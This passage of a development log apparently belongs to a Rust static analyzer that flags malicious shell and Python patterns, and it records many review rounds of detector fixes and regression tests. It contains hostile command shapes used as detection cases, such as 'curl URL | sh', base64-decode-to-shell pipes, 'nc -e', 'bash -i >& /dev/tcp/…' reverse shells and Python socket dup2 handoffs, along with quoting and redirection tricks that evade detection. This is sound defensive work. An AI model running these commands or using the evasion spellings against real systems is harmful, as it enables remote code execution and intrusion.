   decoder must now sit in the pipe segment the interpreter directly
   consumes (`… | base64 -d | sh`), or inside a consumed substitution span
   (`eval "$(openssl enc -d …)"`, `bash <(base64 -d p)`). Multi-stage
   statement boundaries (`;`, `&&`, `||`) end a segment's contribution.
4. **chmod/temp-path pairing was line-wide (P1).** `chmod 777
   "$HOME/private"; echo /tmp/note` emitted the High controlled rule, and
   `printf 'sudo /tmp/helper'` fired the indicator from quoted prose. Both
   rules are now statement-scoped: the indicator requires a live
   (`unquoted`) privilege wrapper whose own statement references a /tmp or
   /dev/shm path, and the controlled rule requires the chmod's statement
   to carry both the writable mode and the shared-temp target. Statement
   splitting (`;`, `&&`, `||`) runs on unquoted text so separators inside
   string literals never split, while `|` pipes and `>&` redirects stay
   intact.
5. **QML argv egress came from any argv word (P2).** `command:
   ["notify-send", "curl failed"]` recorded network access. Egress now
   attributes from the executable position only: argv[0] spelling a fetch
   tool (basename-aware), the first word of a single string-command form,
   or the `-c` script body of an interpreter head (executed code, so
   `["sh", "-c", "curl … | sh"]` still attributes). Computed heads
   (`["sh", "-c", buildScript()]` or a dynamic argv[0]) contribute nothing
   and stay unattributed until H4 dataflow — never guessed from argument
   words. The AST path extracts per-element runtime values (a mixed
   literal/identifier array classifies element-wise instead of joining the
   whole expression text).

Also tightened: `/dev/tcp/` detection moved to unquoted text, so quoted or
echoed mentions are prose, not a redirect the shell performs (the unquoted
redirect spelling in the reverse-shell fixture still fires).

Tests: the reviewer's five exact cases are pinned (quoted eval prose,
`eval "$(date)"; curl …`, decode with an unrelated `printf ok | sh`,
`chmod 777 "$HOME/private"; echo /tmp/note`, `["notify-send", "curl
failed"]`) plus new positives (Popen/fileno wiring, `sh -c` argv egress)
and negatives (echo-wrapped fetch, connect-without-handoff, cross-statement
temp paths). Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 121 analyzer (parser) / 111 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (second round, four findings)

Status: **complete**

Second-pass review confirmed end-to-end repros for three finding-producing
gaps and one egress false positive. The structural answer is command-
position parsing shared by every shell family.

1. **Statement scope was still not command scope (P1).** `echo chmod 777
   /tmp/not-executed`, `echo /dev/tcp/203.0.113.7/4444`, and
   `echo base64 -d | sh` emitted High findings because the predicates
   accepted needle words in any position. New `segment_commands` parses
   each pipeline segment into its command-position heads (the leading
   word after `VAR=value` prefixes, plus a word directly behind a
   privilege wrapper) with per-head arguments. Bindings now enforced:
   `chmod` owns its mode and target; `nc`/`ncat`/`netcat` own `-e`/`-le`;
   `socat` owns `exec:`; `bash -i` owns the redirect; the `/dev/tcp/`
   token requires an interpreter or `exec` command head AND a redirect
   operator in its segment; the shared-temp indicator requires the
   wrapper in command position. `echo curl x | sh` also went silent —
   the fetch tool must head the segment feeding the interpreter (echoed
   output downloads without executing a payload), and a stdout redirect
   on the fetching/decoding segment (`curl x > f | sh`) starves the pipe
   and is no longer a chain. `sudo chmod 777 /tmp/x` and
   `sudo nc -e …` still fire through the wrapper path.
2. **Python descriptor handoff was unbound (P1).** `s =
   socket.create_connection((host, 443)); os.dup2(1, 2)` and
   `s.connect(…); os.dup2(log.fileno(), 1)` emitted the High rule.
   `python_reverse_shell` now collects the socket NAMES (receivers of
   `.connect(`, assignment targets of `create_connection(`) and requires
   a `dup2(`/`Popen(` call whose own argument span passes one of those
   names' `fileno()` — or an inline `create_connection( … ).fileno()`
   chain. Independent socket and dup2 words never fire.
3. **Statement splitting cut inside consumed substitutions (P1).**
   `eval $(curl URL; printf true)` and `bash <(curl URL && cat)` were
   split inside the substitution; each truncated slice was unbalanced,
   evading download-execute. `statement_ranges` and the new
   `pipeline_ranges` now track `$(`/`<(`/group parenthesis depth and
   split only at depth zero, so the substitution keeps its balanced span
   and the fetch inside is detected (pinned by test).
4. **`-c` bodies used a line-wide word search (P2).** `Process {
   command: ["sh", "-c", "echo curl failed"] }` recorded network access.
   `script_body_fetches` now statement-splits the body with the same
   rules and requires a fetch tool in command position; `curl example.test
   | sh` as a body still attributes egress.

Tests: the reviewer's four repros are pinned as regressions (echoed
chmod/dev-tcp/base64/nc/curl/sudo operands, both unbound Python dup2
shapes, both nested-substitution POSITIVE cases, and the echo-only `-c`
body), plus wrapper-path positives (`sudo chmod`/`sudo nc -e`). Full
verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 123 analyzer (parser) / 113 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (third round, four findings)

Status: **complete**

Third-pass review confirmed four end-to-end repros against the
command-position rewrite. All four are fixed and pinned.

1. **Wrapper unwrap was not command-position bound (P1).** `echo sudo
   chmod 777 /tmp/not-executed` emitted the High controlled rule because
   the loop scanned every token for a wrapper. `segment_commands` now
   only unwraps when the CURRENT command head is `sudo`/`pkexec`/`doas`,
   consuming the wrapper's own options (separate values `-u root`,
   glued `-uroot`, `--user=root`, clusters `-nEH`, `--`, env prefixes)
   before the wrapped command; wrapper words inside another command's
   argv stay operands. The wrapper head itself is also recorded, so the
   Low indicator keeps firing for `sudo /tmp/omarchy-helper --install`.
2. **Pipe reachability ignored intermediate segments (P1).** `curl URL |
   cat 1>/tmp/body | sh` emitted High although `cat` drained the bytes.
   Reachability now requires EVERY segment between producer and
   interpreter to preserve stdout (`stdout_reaches`), with
   descriptor-aware token parsing: `>`, `>>`, `1>`, `1>>`, `&>`, `>&`,
   and `1>&2` starve the pipe; `2>`, `2>&1`, `<>`, `<` do not; `>&1`
   self-duplicates and keeps it. `curl URL 2>/dev/null | sh` still
   fires.
3. **`create_connection` assignment reached across statements (P1).**
   `log = open(...); socket.create_connection((host, 443));
   os.dup2(log.fileno(), 1)` emitted the High Python rule. The target
   extraction is now bounded at the `;`/newline that starts the call's
   own statement, so an earlier statement's assignment binds nothing;
   comparison operators (`==`, `<=`, `>=`, `!=`) are rejected.
4. **Script egress still used a line-wide word search (P2).** `echo curl
   https://example.test/not-egress` recorded `network-access`. Top-level
   script egress now reuses `script_body_fetches` — the same
   statement/pipeline command-position parser as QML argv — and the
   now-unused line-wide predicate is gone.

Tests: the reviewer's four repros are pinned (echoed wrapper, six
starved-pipe spellings plus four preserving ones including the
multi-hop decode chain, both Python locality shapes, echoed-curl egress
silence with a command-position wget positive), plus wrapper-option
positives (`sudo -u root chmod a+w /dev/shm/staging`,
`sudo -uroot chmod 777 /tmp/x`). Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 124 analyzer (parser) / 114 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (fourth round, four shell-grammar gaps)

Status: **complete**

Fourth-pass review confirmed four shell-grammar gaps against the
command-position rewrite — three direct High-rule evasions and one egress
false negative. All four are fixed and pinned. The structural answer is
that quote removal is now a token-level *expansion*, not a blanking:
`expanded_text` drops quote delimiters and keeps the interior runtime
bytes (neutralising only the quoted metacharacters, so a literal never
splits a statement), and command position — not quote presence —
decides execution. `unquoted_text` is retained for the Python
pure-substring needles and the substitution-span extraction, which carry
no command-position model.

1. **Quoted tokens were erased before parsing (P1).** `"curl" URL | sh`,
   `nc "-e" host`, `chmod "777" /tmp/x`, and `exec 5<>"/dev/tcp/h/p"` all
   evaded their rules because `unquoted_text` blanked the quoted words. The
   shell families now read `expanded_text`: a delimiter adjacent to a word
   byte glues (`VAR="curl"` stays one assignment token and never becomes a
   head), otherwise it ends the token cleanly, so `"curl"` reduces to
   `curl` in command position while `echo 'curl …'` and `log "curl …"`
   stay operands. Byte length is preserved, so raw-line offsets still
   align.
2. **Leading redirections hid the command (P1).** `2>/dev/null curl URL |
   sh` selected `2>/dev/null` as the head, emitting neither egress nor the
   High finding. `segment_commands` now consumes leading redirections —
   glued (`2>/dev/null`) and separated operator/operand pairs (`2>
   /dev/null`, `>& 1`), interleaved with env assignments — before
   selecting the executable (`leading_redirect`/`skip_command_prefixes`).
3. **Separated descriptor-duplication operands were misread (P1).** `curl
   URL >& 1 | sh` was silent: the bare `>&` token was judged as
   redirecting away before its `1` operand was seen. `segment_redirects_stdout`
   now glues a bare dup operator (`>&`, `1>&`) to its following token and
   re-judges, so self-duplication (`>& 1`) keeps the pipe fed while `>& 2`
   still starves it.
4. **Egress skipped command substitutions (P2).** `payload=$(curl URL)`
   recorded no capability because the outer segment is a bare assignment
   whose head never fetches. `script_body_fetches` now descends recursively
   into `$( … )` and backtick substitutions (balanced spans shrink each
   step, so the recursion terminates). Live command substitution inside
   double quotes remains out of scope — the confirmed repro is unquoted,
   and the prior blanking never attributed it either.

Tests: the reviewer's exact shapes are pinned
(`quoted_command_tokens_keep_their_runtime_value` with the four quoted
execution cases plus quoted-prose and quoted-assignment negatives,
`leading_redirections_do_not_hide_the_command`,
`separated_descriptor_duplication_keeps_the_pipe_fed` with the `>& 2`
starve negative, `command_substitutions_attribute_egress` including a
nested `$( … $( … ) … )`). Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 128 analyzer (parser) / 118 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (fifth round, real shell tokenizer)

Status: **complete**

Fifth-pass review rejected the fourth round's offset-preserving glue string
(`expanded_text`) as unable to represent a token's runtime value and its
source syntax at once — it produced a false negative and, worse, a false
positive. The glue is removed and the whole shell engine now runs on a real
tokeniser (`tokenize`) that yields WORD tokens (expanded runtime value +
active substitution interiors) and unquoted OPERATOR tokens (control and
redirection syntax), with statement/pipeline segmentation and all detectors
re-expressed over `&[ShellToken]`. Value and syntax are now separate fields,
as the review required.

1. **Glue changed the runtime word; escapes were ignored (P1, two bugs).**
   `c"ur"l URL | sh` glued to `c_ur_l` and evaded download-execute/egress,
   and `log "literal \"; curl URL | sh"` mis-closed the string at the
   escaped quote and falsely recorded egress. The tokeniser concatenates
   adjacent fragments (`c"ur"l` → `curl`), honours backslash escapes in and
   out of double quotes, and only treats an *unquoted* `;`/`|`/`>` as an
   operator — so the escaped case stays one prose word with no live curl.
2. **Read-write redirects ignored the explicit descriptor (P1).** `curl URL
   1<>/tmp/body | sh` emitted High because any `<>` was read as input-only.
   `redirect_moves_stdout_away` now parses the leading fd (default 1 for `>`
   forms, 0 for `<` forms): bare `<>` is stdin and keeps the pipe, `1<>`
   puts stdout on the file and starves it.
3. **Double-quoted command substitutions were dropped (P2).**
   `payload="$(curl URL)"` recorded no egress. The tokeniser records active
   substitutions from inside double quotes (single quotes stay inert), and
   `tokens_fetch_egress` recurses into every active `$( … )`/backtick span,
   so both quoted and unquoted assignments attribute egress.

Because operators are lexed only when unquoted, the previous rounds' fixes
fall out of the model for free: leading redirections and env assignments are
skipped uniformly (operator + target word), `>& 1` and `>&1` are one
`Op(">&")`+target either way, and `$(…;…)` separators live inside a word so
they never split a statement.

Tests: three new regressions pin the reviewer's confirmed cases
(`concatenated_quote_fragments_form_one_word`,
`escaped_quote_keeps_the_separator_quoted`,
`read_write_redirect_honours_the_explicit_descriptor`), the P2 case and a
single-quoted-inert negative join `command_substitutions_attribute_egress`,
and all prior H3 shell tests pass unchanged over the new engine. Full
verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 131 analyzer (parser) / 121 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (sixth round, four tokenizer-consumer gaps)

Status: **complete**

Sixth-pass review confirmed four tokenizer-consumer gaps against the real
shell tokeniser — two false negatives, one false positive, and one
structural miss. All four are fixed and pinned. The tokenizer itself was
already sound; every gap was in how a consumer interpreted its output.

1. **A single `&` did not terminate the preceding pipeline (P1).**
   `echo safe & curl URL | sh` missed both egress and the High finding
   (curl was in no segment's command position), while
   `curl URL & echo safe | sh` emitted High even though curl is not piped
   into the shell. `statement_segments` now splits on the bare `&`
   operator exactly like `;` — it terminates and backgrounds the preceding
   pipeline, so the next list starts a NEW statement — while `&>`/`&>>`
   stay redirection tokens and never split. The backgrounded fetch is
   still egress, correctly capability-level.
2. **Redirect targets became command operands (P1).** `nc > -e host port`
   emitted the reverse-shell rule and `chmod > 777 /tmp/x` the
   controlled-temp rule because argv was every word after the head.
   `command_arguments` walks the segment and skips each redirection
   operator together with its target word, so an operand can never read as
   a detector flag or mode while real operands still bind across a
   redirect elsewhere in the command.
3. **`$(( … ))` was classified as command substitution (P1).**
   `eval $((curl))` recorded network access and emitted High
   download-execute although `curl` is only an arithmetic variable and no
   fetch command runs. A new `SubstKind::Arithmetic` is opened by the
   adjacent `((` (a spaced `$( (cmd) )` stays a command substitution), and
   the word's runtime value becomes a number so the expansion never reads
   back as a command word. `consumed_substitutions` never executes
   arithmetic, and egress recursion inside an arithmetic expression looks
   only at the genuine command/process substitutions nested within it —
   `$(( $(curl x) + 1 ))` still records, `$((curl))` is silent.
4. **Pipelines inside subshell groups were never analyzed (P1).** Pipeline
   splitting suppresses `|` at nonzero paren depth, but no pass analyzed
   the group interior, so `(curl URL | sh)` recorded egress without the
   High finding. `grouped_token_ranges` matches every `(` … `)` interior by
   depth and `shell_consumption_findings` (the statement-scoped families,
   now extracted from the line loop) recurses over group interiors as
   their own statement lists, so backgrounding and nesting split there
   too. Findings are deduplicated per rule and semantic tag within a line:
   a group's content is already partially bound through its opening `(` by
   the outer pass, and repeated identical statements add no information
   (two identical `curl … | sh` statements on one line now emit one
   finding).

Tests: four new regressions pin the reviewer's confirmed cases
(`ampersand_terminates_the_preceding_pipeline` with the egress-only and
`&>`-is-a-redirect negatives, `redirect_targets_are_never_command_operands`
with real-operand positives, `arithmetic_expansion_is_not_a_command_
substitution` with a nested-substitution positive,
`subshell_groups_run_their_own_statement_analysis` with the single-fire
and quoted-prose negatives). All 19 prior H3 tests pass in both feature
configurations. Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 150 analyzer (parser) / 140 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (seventh round, four false negatives, two false Highs, one crash)

Status: **complete**

Seventh-pass review confirmed seven issues against the group-recursion
round: one crash, two false High findings, and four false negatives. All
seven are fixed and pinned. Bash's actual `(( … ))` behaviour was checked
empirically before implementing (see item 2): adjacent `((` with a
matching `))` is ALWAYS an arithmetic command — an invalid expression is
an error and runs nothing — while `((a) && echo RAN)` (no `))` anywhere)
backtracks to a subshell and runs.

1. **Shell analysis recursion had no budget (P1, crash).** ~24 KB of
   12,000 nested groups overflowed the stack and aborted the CLI (exit
   134). A `ShellBudget` (depth 64, 250k node visits per line) is now
   threaded through every recursive descent — compound-group recursion,
   substitution egress recursion, and the arithmetic walk — and
   exhaustion degrades to a `shell-analysis-budget-exhausted:{path}`
   coverage limitation instead of crashing. `FileOutcome` carries
   per-file limitations that `analyze_inventory` anchors onto the entry
   path; interpreter `-c` bodies get a fresh budget per call.
2. **Arithmetic commands executed their operands (P1).** `(( curl | sh ))`
   recorded egress and emitted High download-execute although bash runs
   nothing. The tokeniser now emits `((`/`))` as one operator pair when a
   matching `))` closes the group (depth- and quote-aware scan), and
   `GroupKind::Arithmetic` interiors are never analysed as command lists —
   only their nested command substitutions attribute egress. A group with
   no `))` still reads as two subshell parens (`((a) && b)` runs), which
   the reachability and group passes continue to cover.
3. **Redirect targets bound temp paths (P1).** `chmod 777 "$HOME/private"
   > /tmp/chmod.log` and `sudo /usr/bin/true > /tmp/sudo.log` fired the
   temp rules because the path scan read every segment word.
   `segment_has_shared_temp_path` now reads each command's real arguments
   (redirect operands already excluded), so a log target never associates
   a path with a command that never touched one.
4. **`bash -i` accepted any redirect (P1).** `bash -i >
   /tmp/interactive.log` emitted the blocking reverse-shell rule. The
   branch now requires the descriptor-duplication spelling (`>&`, with or
   without leading fd digits); plain `>` stays silent while `>& /dev/tcp/…`
   and `>& 3` still fire.
5. **`|&` was not a pipeline operator (P1).** `curl URL |& sh` split into a
   statement ending at `&`, missing download-execute. The tokeniser emits
   `|&` as one operator and pipeline splitting includes it; reachability
   is unchanged (it feeds stdout, it never starves it).
6. **Compound groups were detached from their pipelines (P1).**
   `(echo safe; curl URL) | sh` missed egress and download-execute (the
   outer pass saw `echo` as the producer; the inner pass saw no consumer),
   and `{ curl URL | sh; }` was missed entirely. Lone `{`/`}` words are now
   brace-group operators (glued braces like `${x}` and `-exec {}` stay
   words), and the producer/consumer predicates recurse over compound
   groups' statement lists, so a group fetches or consumes through ANY of
   its commands while stdout reachability still gates the chain.
7. **Execution prefixes stayed the selected head (P1).** `command curl URL
   | sh`, `env curl URL | sh`, and `! curl URL | sh` produced nothing.
   `command` and `env` join the wrapper unwrapping (options, valued
   options, assignments, `--`), `!` joins the skippable prefixes, and
   `command -v/-V` correctly unwraps to nothing (it describes, never
   executes).

Tests: seven new regressions pin the confirmed cases
(`shell_analysis_budget_bounds_adversarial_nesting` with 12k spaced subshell
nesting, 2k substitution nesting, and a moderate-nesting no-limitation
negative; `arithmetic_command_is_not_a_command_list` with the
subshell-backtrack and arithmetic-then-pipeline positives;
`temp_paths_bind_through_command_arguments`,
`bash_interactive_requires_duplication_redirect`,
`pipe_ampersand_feeds_the_pipeline`,
`compound_groups_participate_in_pipelines` with a consumer-group positive
and an echo-operand negative, and `execution_wrappers_reach_command_position`
with the `command -v` describe-only negative). All 23 prior H3 tests pass
in both feature configurations. Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 157 analyzer (parser) / 147 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

Next: H7 early-pass corpus triage of `oma.script.reverse-shell` and
`oma.script.privileged-shared-temp-controlled` (both families now exist and
can be measured concurrently with H4–H6), then H4 (bounded intra-file
dataflow).

## v0.2.1 H3 — Review Response (eighth round, one panic, two group-hierarchy defects, and four analysis-model gaps)

Status: **complete**

Eighth-pass review found seven issues against the budget round: one
tokenizer panic, two defects in how compound groups are enumerated, and
four gaps in the execution model (substitution interiors, pipe stdin,
producer redirect scoping, wrapper completion, and `-c` budget
disclosure).

1. **Malformed arithmetic still panicked the scanner (P1, crash).**
   `(( 1 ) ) )` drove `arithmetic_command_close`'s paren depth below
   zero (`attempt to subtract with overflow`, CLI exit 101). A close at
   the opening pair's own depth unbalances the `((`, so the scan now
   bails to the subshell reading instead of decrementing — depth never
   goes below 2, invalid input reads back as plain parens, and the rest
   of the file still analyzes.
2. **Compound groups were enumerated as peers, not a hierarchy (P1).**
   `grouped_token_ranges` returned every nested group, so
   `(( (curl URL | sh) ))` surfaced the inner parentheses as a live List
   group (false egress + High download-execute — those parens are
   arithmetic grouping and run nothing), and every ancestor's recursion
   revisited all descendants, exhausting the 250k-node budget at only 24
   valid nested subshells. The function now emits top-level,
   non-overlapping groups left to right (shared `matching_group_close`
   scan); callers recurse into interiors and re-discover children, so
   each group is analyzed once and nothing inside an arithmetic group is
   ever surfaced as a command list.
3. **Pipelines executed inside substitutions were invisible (P1).**
   `payload=$(curl URL | sh)` and `decoded=$(printf blob | base64 -d |
   sh)` execute their interiors NOW — only whether the resulting OUTPUT
   is further consumed depends on the outer head — yet produced no High.
   The consumption families recurse into active command/process
   substitution interiors (and into genuine command substitutions nested
   in arithmetic, `x=$(( 1 + $(curl URL | sh | wc -c) ))`) while the
   existing outer-output binding (`eval`/interpreter heads) is retained.
   Single-quoted substitutions stay prose; fetch-without-interpreter
   stays capability-level.
4. **Every grouped interpreter read as a pipe consumer (P1).**
   `curl URL | (cat >/dev/null; sh)` fired although `cat` drains the
   fetched body and `sh` receives EOF. Consumer analysis now tracks the
   piped data through a compound group's statements: a known stdin-
   draining filter (`cat`, `sed`, `sort`, checksummers, …) with no file
   operands or stdin detour exhausts the pipe, forwarding filters feed
   the inner pipeline (`(cat | sh)` still fires), non-readers leave the
   pipe intact (`(echo start; sh)` still fires), `grep -m` exits early
   and keeps it readable, and the compound's own fd-0 redirection
   (`( … ) < /dev/null`) starves everything inside.
5. **Redirects inside compound producers were misattributed (P1).**
   `(echo safe >/tmp/log; curl URL) | sh` missed download-execute because
   the producer scan treated `echo`'s log redirect as starving the
   compound's stdout. Redirect scoping is now depth-aware: depth-zero
   redirects (the command's own, or the compound's after its close)
   always count, while inside a compound only the FINAL executed
   command's redirect shapes the compound's stdout — so `(curl URL >
   body) | sh` stays silent and the echo-log form fires.
6. **Execution-prefix unwrapping was incomplete (P1).** `exec curl URL |
   sh` and `time curl URL | sh` produced nothing, and `env -S 'curl URL'
   | sh` lost the command to a mere option value. `exec` and `time`
   (with `-a`/`-f`/`-o` valued options) join the wrapper unwrapping, and
   `env -S`/`--split-string` (exact, glued, and `=` forms) record the
   string's first word as a wrapped command of its own.
7. **Exhausted `-c` body budgets were silently discarded (P1).**
   `script_body_fetches` threw away the fresh budget's exhaustion flag,
   so a QML `Process` with `['sh', '-c', <100 nested command
   substitutions ending in curl>]` recorded neither NetworkAccess nor a
   limitation. It now returns exhaustion alongside the match;
   `argv_head_fetches` propagates both through the lexical and AST
   Process-sink paths into `FileOutcome.limitations` (disclosed once per
   file), while moderate nesting still analyzes and stays silent.

Tests: seven new regressions pin the confirmed cases
(`malformed_arithmetic_input_never_panics`,
`arithmetic_group_hides_list_descendants` with the 24-level
no-limitation positive, `substitution_interiors_execute_pipelines` with
the quoted and arithmetic negative, the consumer-stdin and producer-
redirect scoping tests with drain/forward/own-stdin and final-command
cases, `exec_time_and_env_split_string_execute_their_command`, and
`exec_time_and_env_split_string_execute_their_command`, and
`qml_c_body_budget_exhaustion_is_disclosed` with a moderate-nesting
no-limitation negative). End-to-end, the malformed-input crash repro was
re-run through the CLI in an isolated XDG environment (inventory →
trust → scan → status → diff): every command exits 0/3 with no abort
(previously exit 101, `attempt to subtract with overflow`). Full
verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 164 analyzer (parser) / 154 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (ninth round, five analysis-model refinements and one depth-accounting fix)

Status: **complete**

Ninth-pass review found six issues against the eighth round: two
false-High/false-negative pairs from one boolean, a consumer false
positive, a false negative, a wrapper gap, and a budget accounting
defect.

1. **Producer stdout was one compound-wide boolean (P1).**
   `(curl URL >/tmp/body; echo safe) | sh` falsely emitted High while
   `(curl URL; echo safe >/tmp/log) | sh` missed it — only the final
   command's redirect was inspected. Producer pairing is now per command
   site (`segment_has_live_producer`): a compound's own depth-zero
   redirect starves every site inside, each inner command's redirect
   starves only that command, short-circuited statements own no live
   sites, and intermediate segments must pass the body through
   (`segment_stdout_preserved` — plain segments keep the long-standing
   no-redirect rule; compound segments forward only when a statement
   reads the live pipe and emits it unredirected). The span checks
   (`eval "$( … )"`) migrated to the same site model.
2. **Interpreter identity implied stdin execution (P1).**
   `curl URL | sh -c 'echo safe'` and `curl URL | sh
   /tmp/local-script.sh` emitted High although the shell executes the
   body or file instead of the pipe. `command_reads_stdin_script` now
   reads interpreter arguments: a `-c` body (glued or separate) or a
   script-file operand means stdin is not executed, while `-s` (sh
   family), a bare `-` operand, or no arguments at all keep the pipe
   live (`curl URL | sh -s`, `| bash -s --`, `| python3`, `| sh -` still
   fire).
3. **Conditional lists executed every statement (P1).**
   `statement_segments` discarded whether a boundary was `&&`, `||`, or
   `;`, so `curl URL | (false && cat >/dev/null; sh)` missed High — the
   model let `cat` drain a pipe it never reads because bash skips it.
   `conditional_statements` preserves the control operator and a
   three-value outcome model (`true`/`:` succeed, `false` fails,
   everything else keeps both branches executable) gates every walk:
   the consumer stdin walk, the intermediate-forward walk, producer
   sites, the consumption families, the egress walk, and the consumed-
   span checks. `false && curl URL | sh` no longer records egress or
   High either; `false || cat` still drains because it really runs.
4. **Arithmetic command groups skipped their substitutions (P1).**
   `(( $(curl URL | sh) + 1 ))` recorded network access but no High —
   the group recursion only descended into List groups. Arithmetic
   interiors now run the substitution-only consumption walk
   (`tokens_arithmetic_consumption`), the same walk `$(( … ))` expansion
   tokens use, so a nested command substitution's pipeline fires.
5. **GNU time's valued short options were unreadable (P1).**
   `/usr/bin/time -f '%e' curl URL | sh` selected `%e` as the wrapped
   command; `-o FILE` lost the command the same way. `-f` and `-o` join
   `--format`/`--output` as valued options; `-a`/`--append` stays a
   flag.
6. **Arithmetic expansions charged depth twice (P2).**
   `arithmetic_consumption_findings` entered once at entry and again
   before dispatching each nested substitution, so arithmetic levels
   cost two depth units and a valid 40-level expression ending in
   `$(curl URL | sh | wc -c)` missed High. Each recursive helper now
   owns its single charge, and the egress and consumption traversals of
   a line each get their own budget instead of sharing one depth
   account across two walks of the same tree.

Tests: six new regressions pin the confirmed cases
(`compound_producer_stdout_tracks_its_command`,
`interpreter_stdin_mode_is_argument_sensitive`,
`conditional_lists_gate_stdin_consumption`,
`arithmetic_command_groups_analyze_nested_substitutions`,
`time_valued_short_options_reach_the_wrapped_command`,
`deep_arithmetic_nesting_stays_within_the_depth_budget` with the
40-level no-limitation positive). Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 170 analyzer (parser) / 160 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (tenth round, four pipeline-boundary refinements, one outcome-model gap, and one option-parsing fix)

Status: **complete**

Tenth-pass review found six issues against the ninth round: five
pipeline/stdin-model false positives and false negatives around
compound interiors, intermediates, and option parsing, plus two
conditional-outcome defects and an ungated egress recursion.

1. **A producer's own inner pipeline was unchecked (P1).**
   `(curl URL | cat >/dev/null) | sh` emitted High — inside a compound,
   any live producer site was accepted without following its output
   through the rest of its nested pipeline. Producer pairing now draws
   the boundary at the enclosing context (`pipeline_has_live_producer`):
   a site counts only when its stdout survives every remaining segment
   of its own pipeline to become the compound's stdout, and the
   executed-span checks (`eval "$(curl URL | cat >/dev/null)"`) use the
   same test, where the boundary is the substitution's collected output.
2. **Every plain intermediate stage read as forwarding (P1).**
   `curl URL | echo safe | sh` emitted High because a plain stage kept
   the long-standing no-redirect rule. Plain stages now require the
   same known-forwarding model compound stages use
   (`segment_stdin_behavior`): `echo`, `true`, `wc`, and `xargs` (which
   spends the pipe on child argv) stop the body, while `cat`, `sed`,
   `tee`, `gzip -d`, `xxd -r`, and `openssl enc -d` (joined to the
   drain set) pass it on. The forward/drain split also corrects the
   compound walk: drainers that emit derived output no longer count as
   forwarding it.
3. **One guarded outcome overwrote the alternate path (P1).**
   `printf ok || false && curl URL | sh` runs the fetch in bash, but the
   single-value outcome model executed `false`, stored Failure, and
   skipped the fetch. The model now tracks the SET of possible statuses
   (`Outcomes`): a guarded statement that may run contributes its own
   outcomes to the executed paths while skipped paths keep theirs, and
   a guard admits a statement when any live path lets it through.
4. **Pipeline negation was invisible to the outcome model (P1).**
   `! true` modelled as Success because `segment_commands` strips the
   leading `!`, so `! true || curl URL | sh` missed both egress and
   High. `statement_outcomes` detects the `!` reserved word opening the
   pipeline and inverts known statuses (`! true` fails, `! false`
   succeeds, double negation counts parity); unknown stays unknown.
5. **Egress recursion ignored conditional guards (P2).**
   `(false && curl URL)` recorded NetworkAccess — the top-level walk
   honored guards, but group lookup (`group_contains_command`) and the
   final flat substitution scan examined every token regardless of
   execution. Egress now walks each executed statement recursively:
   list-group interiors keep their guards at every nesting level, and
   depth-0 substitutions are scanned only where the statement actually
   runs (`executed_list_fetch_egress`).
6. **Interpreter options were matched by substring (P1).**
   `bash --norc` missed High because any option text containing `c` read
   as `-c`, and `python3 -W ignore` read `ignore` as a script file.
   `command_reads_stdin_script` parses options exactly per family:
   shell clusters handle `-c`/`-s`/`-o` (glued or separate) and `+`
   set-options, long options are classified (`--norc` a flag,
   `--rcfile` valued, `--help`/`--version` exit-before-stdin), and
   python `-c`/`-m` replace stdin while `-W`/`-X` consume a glued or
   separate value.

Tests: six new regressions pin the confirmed cases
(`compound_producer_survives_its_inner_pipeline`,
`plain_intermediates_forward_only_known_filters`,
`conditional_outcomes_merge_executed_and_skipped_paths`,
`pipeline_negation_inverts_known_outcomes`,
`egress_stays_inside_executed_branches`,
`interpreter_options_parse_by_arity`). Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 176 analyzer (parser) / 166 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (eleventh round, opaque bodies, blind modes, missing stdin-code consumers, and physical-line analysis)

Status: **complete**

Eleventh-pass review found six issues against the tenth round, all
about text the analyzer treated as opaque or read at the wrong
granularity. The fixes follow the suggested shared abstractions:
structured interpreter modes, a recursive static-body summary, explicit
stdin-code consumers, mode-sensitive transformers, and logical-command
assembly.

1. **Literal `-c` bodies were opaque (P1).**
   `sh -c 'curl URL | sh'`, `sh -c 'curl URL' | sh`, and
   `curl URL | sh -c sh` all missed High — returning false for `-c`
